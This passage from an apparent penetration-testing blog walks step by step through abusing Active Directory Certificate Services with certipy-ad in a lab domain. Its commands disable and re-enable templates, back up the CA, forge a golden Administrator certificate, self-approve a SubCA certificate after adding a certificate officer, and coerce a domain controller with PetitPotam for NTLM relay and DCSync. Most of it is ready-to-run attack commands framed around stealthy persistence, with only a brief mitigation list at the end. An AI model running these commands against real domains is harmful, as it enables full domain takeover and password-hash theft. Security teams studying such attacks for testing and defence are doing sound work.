+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjseT7KHTP4cATBCtXVMBpaz9IVB-YOWpF_hbcNWTWIY0yDdhwizn0NoOeaBnOShUgTTjjUfU-SWkC41xgIul4RL21mk8MAkwmQ82QX7eKKy44lV0P8xJwCzkaei7IjwcXjhAaPcYDgr-LCMdshQy_EGq6mZkH5q3OerDdMxd7sb6dRS2NKHbRdS4S-jaUE/s16000/20.png"/></p>
+<p><span style="color: #000000"><em><strong>Note</strong>: This reapply known-vulnerable settings to a template, allowing future certificate-based exploits (e.g., ESC1, ESC4) without the need for CA admin credentials</em>.</span></p>
+<h4><span style="color: #000000">Enumerate Available Templates from the CA</span></h4>
+<p><span style="color: #000000">This command lists all templates currently published by the CA.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad ca -u sanjeet -p Password@12 -dc-ip 192.168.1.20 -target 192.168.1.20 -list-template -ca ignite-DC01-CA</pre>
+<p><span style="color: #000000">This helps us to identify whether these target templates (e.g., ESC1, ESC4) are currently <strong>active</strong>, and if <strong>additional exploitable templates</strong> are available for abuse.</span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjE03K_lUOFeOBn3ZT74zueEuXqh_Ri5rIPsoz4mlCgkCHyZgDekBOEFaar1wkxcRt72MKVsWnWObBwqPqWiC_YXk8_-Al05TlsQaO8yNo2cJsu0782iQYyBCDfDb45T4MMikXsZgPjjNZtx4aBQfobEnYFBd3-mBqtIDRw8xKGF3AMXVFFReHTsMtxcEdn/s16000/21.png"/></p>
+<h4><span style="color: #000000">Disable a Template </span></h4>
+<p><span style="color: #000000">This command helps us to disable the ESC1 template from the CA’s published list.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad ca -u sanjeet -p Password@12 -dc-ip 192.168.1.20 -target 192.168.1.20 -disable ESC1 -ca ignite-DC01-CA</pre>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjC-NJxKpkO1Heh1ET6wJ0EyZigX6il6kyyJ_YoCgapjT3RcKbuoNZQbWBLGUWO70wrh-lZE7SuTIhclFIEmbR28tGJqw46-wvYnaXRCWhMacYQlzbMbtB-wIhLcTGKuhUASbLObnUel_Q7ZWEo5KbeprZDb7qCKw9h9kYbBpMgUdy4N0ZJENqNvRxSQxA1/s16000/22.png"/></p>
+<p><span style="color: #000000"><strong><em>Note: </em></strong><em>Blue teams can use this for <strong>remediation</strong>, or red teams might do it to <strong>disrupt detection</strong>, breaking the exploit chain temporarily until ready to reuse it(as in our case).</em></span></p>
+<p><span style="color: #000000"><em>Let’s quickly check if the template gets disabled or not by firing the command like </em></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad ca -u sanjeet -p Password@12 -dc-ip 192.168.1.20 -target 192.168.1.20 -list-templates -ca ignite-DC01-CA</pre>
+<p><span style="color: #000000">Here we can see that ESC1 is not listed in enabled templates on the CA</span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiIZr_QgqCdU1dVUeo0aqRNE4bhAYrJwsPRW452dH9xaLR59HIqpShjqSpL2NpHXZ82ZHHCqgnDlSR5qlMPkheUK3LAis_-kFvLBwtYo2nR7hGOXCS0kHgVJVf6BZf1uult7Eqte6g6DVJjsuiwwKjnQL0V2BEA9GY8V7RSrTv3W6iSHLSrT-99vdgrA77T/s16000/23.png"/></p>
+<h4><span style="color: #000000">Re-Enable a Template</span></h4>
+<p><span style="color: #000000">This command Re-enables the previously disabled ESC1 template.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad ca -u sanjeet -p Password@12 -dc-ip 192.168.1.20 -target 192.168.1.20 -enable ESC1 -ca ignite-DC01-CA</pre>
+<p><span style="color: #000000">As noted, this lets us restart the certificate attack chain. Particularly if interrupted by defenders, and is useful for red team replay attacks or long-term persistence.</span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgtSnjkPFQOAmcA-wqvZxCl2MBPi3_rdISjjB81-qLWSCUHGH-ZW-fcWPsfqe3VBFUMTK5F2WzKz-mHwM4fDyGJs5hxcGokzIMImHE_JMXnUUOY8766OcuCG-XJqAiiiWyhVcc_TmYnUbSIM0vV8hNxGN-Y7c2SfhtsgDKqe54MlXj3v5-jU_uWhfBqcq93/s16000/24.png"/></p>
+<h4><span style="color: #000000">Full CA Backup</span></h4>
+<p><span style="color: #000000">Backs up the full CA configuration, including templates, permissions, and settings.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad ca -backup -u sanjeet -p Password@12 -dc-ip 192.168.1.20 -target 192.168.1.20 -ca ignite-DC01-CA</pre>
+<p><span style="color: #000000">This provides full visibility into CA operations, allowing us to decide whether to modify, exfiltrate, or replace CA states for template forgery, golden certificate creation, or rollback exploits.</span></p>
+<p><span style="color: #000000">This phase of the attack signifies infrastructure compromise. Here we shift from relying on bugs to managing directly how the domain distributes digital trust.</span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTLY3FSnzqWhAOuqviJo0CFxXWyUsGQ88pGmNhC3LFpthsT5ngqiniv4ynqRQbeM2pbtqcE9pV-adKuVYNnymb7K1TrJwLBkER7fbPGkmdKdX8vA6eKvXdTVYxq7QARGtYrvNrtu_i4T9FA__SYK_yUMVvErMt-WJjfwWGFZCfHh2c7i1v60JJ_EVQE1ip/s16000/25.png"/></p>
+<p><span style="color: #000000"><em><strong>Note</strong>: It transforms AD CS abuse from a one-time exploit into a <strong>long-term, stealthy domain persistence strategy</strong>.</em></span></p>
+<h3><span style="color: #800000">Forging &amp; Relaying Certificates</span></h3>
+<p><span style="color: #000000">With access to the CA’s private key, we forge a certificate impersonating the Domain Administrator or request a SubCA certificate via vulnerable templates, approving it ourselves. We also elevate our privileges by adding ourselves as a certificate officer. Allowing us to issue, approve, and authenticate as any identity, turning the domain’s trust chain into our playground.</span></p>
+<h4><span style="color: #000000">Forge a Golden Admin Certificate</span></h4>
+<p><span style="color: #000000">This command forges a certificate for the Administrator using the CA’s private key, completely bypassing template restrictions or policy controls.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad forge -ca-pfx ignite-DC01-CA.pfx -upn administrator@ignite.local</pre>
+<p><span style="color: #000000">This allows us to authenticate as Administrator anytime, permanently, even if we remove other persistence methods.</span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj8bGu86jMmrRIclQZn0nCFcrhttA_GdM97cRTsDJZQ4sMSkMb8U11o-Kq50hkxrDGz5Kl9EjitlT7oP3ORIWqpp5RrpDLI4bA0ZdWL9XTG6hY_SjoPYrOiO_JC9GQAW9NIjls1cnV7IptVfV3NbzBkkyEfEOyIZF12hBdyBboASv1TXYGXE226lm85FXMd/s16000/26.png"/></p>
+<h4><span style="color: #000000">Request a SubCA Certificate</span></h4>
+<p><span style="color: #000000">This command leverages a vulnerable template that permits SubCA issuance, embedding us further into the domain’s PKI trust chain.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad req -u raj -p Password@1 -ca ignite-DC01-CA -target 192.168.1.20 -template SubCA -upn administrator@ignite.local -dc-ip 192.168.1.20</pre>
+<p><span style="color: #000000">This allows us to function as a subordinate CA, issuing valid certificates for any identity later, independently.</span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjYkwhKB7it_saCCzhSWBl_N_tBiygnSgNJ2E6PdsaJy-w6qngeUHmGz_npTygGf0unqS9P4ftNzrm5AfE2JGNhFcxH4iBGJiKI3fWViI76gTw4TuDvxV0xFLVmMC3VsZL_TW5itwg286HnztnrrzSaaRRRr6kbM5Prnyt11u6B6GI7HgbKvc_5iC_l9Ckp/s16000/27.png"/></p>
+<h4><span style="color: #000000">Approve the SubCA Request</span></h4>
+<p><span style="color: #000000">This command attempts to approve certificate request ID 24 for SubCA enrollment. If the user isn’t a Certificate Officer, the CA will reject the action with an “Access Denied” error.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad ca -u raj -p Password@1 -ca ignite-DC01-CA -target 192.168.1.20 -issue-request 26 -dc-ip 192.168.1.20</pre>
+<p><span style="color: #000000">This demonstrates a common obstacle in SubCA escalation; while users may submit the request successfully, the system enforces approval privileges, preventing unauthorized certificate issuance.</span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiD47nl7AE6rK_C6E4qgSphIgCeIS2jlrT7roOElI2ubp6_yIiirVnbfew0y90SwWSAu8a4hVSsWDmc4_tDPD_23kTvnzvUZkXbva0A_VIW374KCmaajxXPe8qT_q0nug_IWZdoQfJ94pZJo6BmC0mHkuF7zVUe2e8WVaxETFHefBnNM0FzUfSTvJg6wzkL/s16000/28.png"/></p>
+<h4><span style="color: #000000">Add user as a Certificate Officer</span></h4>
+<p><span style="color: #000000">This command grants us authority to manage CA requests, templates, and approvals.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad ca -ca ignite-DC01-CA -u raj -p Password@1 -dc-ip 192.168.1.20 -add-officer raj</pre>
+<p><span style="color: #000000">This enables future SubCA creation, certificate approvals, and enhanced infrastructure control, all without detection.</span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiqYSFAk_q2ITWKGGJWFYyl50cVgd_iO_loCMIyEAJnXgUM0UIa8VJUk4OpevFH0udLLqwdSY9qzEZ1wmtvpLhLCN9NzmtiiC8JN6xB8PZIh_17qIG_0QW4cEDlm_pHiQEs7WasOYHSJPdm9u8OiSF9LYxPQCcGZdOuD1sGAfKJ0upAOAYnV_SM_WA_eU7m/s16000/29.png"/></p>
+<p><span style="color: #000000">Then, we attempt to approve the request again by issuing the pending SubCA certificate using the approval capabilities of a compromised CA officer or template controller.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad ca -u raj -p Password@1 -ca ignite-DC01-CA -target 192.168.1.20 -issue-request 26 -dc-ip 192.168.1.20</pre>
+<p><span style="color: #000000">This confirms our issued SubCAs as valid, enabling the establishment of persistent CA-level backdoors.</span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh3rSzzMsg4zvK6NnCaj5j3f0SrNEQ5AYt4g2_FaJuxysqNyF54htEANTrHfrJTgJ5agRkPIFnoA4SNpj8XsfIlHZsPsY9r7dulSvg-7DNqegoDDFW34lZN50oOhpVW4v55AY9yUks6qw6gTEQPVQd3n85KPFheB1rB_C6OVDBXWr84c4Ysa3oafQopvDUc/s16000/30.png"/></p>
+<h4><span style="color: #000000">Retrieve the SubCA Certificate </span></h4>
+<p><span style="color: #000000">This command retrieves the certificate associated with request ID 24, previously issued by the CA under the SubCA template. Once obtained, this certificate functions as a Subordinate Certification Authority, enabling the holder to sign and issue their own certificates.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad req -u raj -p Password@1 -ca ignite-DC01-CA -target 192.168.1.20 -template SubCA -retrieve 26 -dc-ip 192.168.1.20</pre>
+<p><span style="color: #000000">This step finalises the SubCA escalation path. With this certificate, we can generate <strong>valid certificates for any identity</strong> (e.g., Administrator, Domain Controller), effectively becoming an attacker-controlled CA within the environment.</span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEid50Fh9J-yb2h_pHuzZ74oH2MFPCtd-_h_V0w3i-k9gAMtc7x0PTzVwZysOS7g2WrANXuFoQgtFcAvl0MbQDezT5tSW97BOb7P-IGn3bNv3IhscQddAAg830tMFsuJ79169Ei4pbzA_UKHRobwuc3MVAkInsCBfdaBA74tOWFqr_3HCHPAqA7JbDJ5YpHe/s16000/31.png"/></p>
+<p><span style="color: #000000"><em><strong>Note</strong>: This sequence shows how attackers bypass initial permission failure by gaining CA role privileges, reflecting a typical post-exploitation attack scenario.</em></span></p>
+<h4><span style="color: #000000">Authenticate Using the Admin Certificate</span></h4>
+<p><span style="color: #000000">This command uses a .pfx file to authenticate to Active Directory via Kerberos or Schannel. Bypassing password logins and being accepted as a trusted authentication method.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.1.20</pre>
+<p><span style="color: #000000">This allows us to log in as Domain Administrator using a forged certificate (via CA key) or one issued by the attacker’s SubCA. Granting full domain control without needing to steal credentials or crack passwords.</span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh1JocneBvpRX3UZRNkG26vrnm_Vq2gTuuZxqWHaDl9UY2Fui4Cj4ceY_FnmrbnIes34Co_A2ScUFEb3kZp1Y35GDczr_MS4-cedb-XrYi_5NSgzA_9i-UiWbeez9yL9XQOXvXU_3EzWcZ-qxgeVNw5Sx47wMl7OEMea0jpSUrnTeIzPZGVR4dmUGECc4Bn/s16000/32.png"/></p>
+<p><span style="color: #000000"><strong>When CA keys aren’t available</strong>. This path uses <strong>network coercion and relay attacks</strong> to achieve equivalent results authenticating as a Domain Controller without touching passwords or credentials directly.</span></p>
+<h4><span style="color: #000000">Relay Authentication to the CA</span></h4>
+<p><span style="color: #000000">This command Sets up a relay server targeting the CA’s Web Enrollment endpoint with a template that auto-issues machine certs.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad relay -target 192.168.1.17 -template DomainController</pre>
+<p><span style="color: #000000">This prepares to receive a coerced NTLM connection from a domain controller and use it to request a cert</span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEibF7GVuaOmq8MdzFMw2YIL8JxGU7VslwKSPw7pu6iEGAm_trCkBcweViTucRn2xDY-Xd5TYyww-_wZR4V85vhwU0d5P_dnXETGcd5OmofdLCaBiHdojxQpqXq8U6f4Cbv-v4aLtPfI_ipCtUcnhzGzVu4uGMSlK3TIw9elIiw8oBA6NISMQYI_5iJKLpmR/s16000/33.png"/></p>
+<h4><span style="color: #000000">Coerce a Domain Controller Using PetitPotam</span></h4>
+<p><span style="color: #000000">This command triggers a domain controller to authenticate to our (attacker’s) relay server via MS-EFSRPC or similar coercion.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python PetitPotam.py -u raj -p Password@1 192.168.1.12 192.168.1.14</pre>
+<p><span style="color: #000000">This forces NTLM authentication from the DC, which someone can capture and relay to the CA for certificate abuse.</span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjOo8Chz18cR0H3S9cL5Czp-9yVVVekXqNv7ygj7aEKFLf_HslHrHBt-6XJ8NEJCBDK3v3jT01Eih3jyQSGY_2gUgZ5vDJlhoA5ghHj5_xib7bDbhimxtdcC2K-cogDrmZp6ve0ygr_cp1gSmL6seoazNq93m4hIRpeLZ2Q_fNBogRdrzxsA9Hg0ojpG3IN/s16000/34.png"/></p>
+<h4><span style="color: #000000">Alternately Relay with certipy</span></h4>
+<p><span style="color: #000000">This command ensures the relay server is still active or retries to complete the cert request successfully.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad relay -target 192.168.1.17 -template DomainController</pre>
+<p><span style="color: #000000">This is useful in environments with unstable connections or if first coercion fails.</span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgwxHwCy2KhmaP7XDwumY1yOlzG2g-LJKUUTRi5sqatlPSxt8p76YgXAChvNmWAaEXIRav-tpVxnCOsIgduhSitvVl-whHkKk8TuSOwHcQlygDk9D147Cpbus1D8mjn6qP2cSy_SNvMOoVNKXOMYXD5Hc1cofA4h6OWiBZS2cfhuonWlrQ6771rNkSibCo0/s16000/35.png"/></p>
+<h4><span style="color: #000000">Authenticate as the Domain Controller</span></h4>
+<p><span style="color: #000000">This command uses the issued DC certificate to authenticate via PKINIT and start an LDAP session as the domain controller.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad auth -pfx dc1.pfx -dc-ip 192.168.1.14 -ldap-shell</pre>
+<p><span style="color: #000000">This grants full replication privileges via <strong>DCSync</strong>, enabling password hash extraction for any user, including Enterprise Admins.</span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjLcgOG8nBJrn-1C4tTtsr50xZJm_P75lRavRzJWoFTC_tUOiTX5270mcm_SJbUIDPAsZqdFkb1JVh4_Gt23t5xp5a3_y65wqDqcJMaT9rsgupRHABXcPy2flQtoG3zHlyJAVJaDkejqk9JPhevsDrrvFBbqyKmh6Zs3jQXuZa3rViXmjmozcl55yr-UPOO/s16000/36.png"/></p>
+<h3><span style="color: #800000">Mitigation</span></h3>
+<ul>
+<li><span style="color: #000000">Harden and audit certificate templates</span></li>
+<li><span style="color: #000000">Control AD write permissions (including “Enroll” rights, shadow, account creation)</span></li>
+<li><span style="color: #000000">Audit all certificate issuance and CA-level changes (Event IDs 4886,4887)</span></li>
+<li><span style="color: #000000">Consider disabling Web Enrollment and NTLM where possible</span></li>
+</ul>
+<p><span style="color: #000000"><strong>Author: </strong>MD Aslam is a dynamic Information Security leader committed to driving security excellence and mentoring teams to strengthen security across products, networks, and organizations. Contact</span> <strong><a href="https://www.linkedin.com/in/md-aslam-7b04ab144">here</a></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
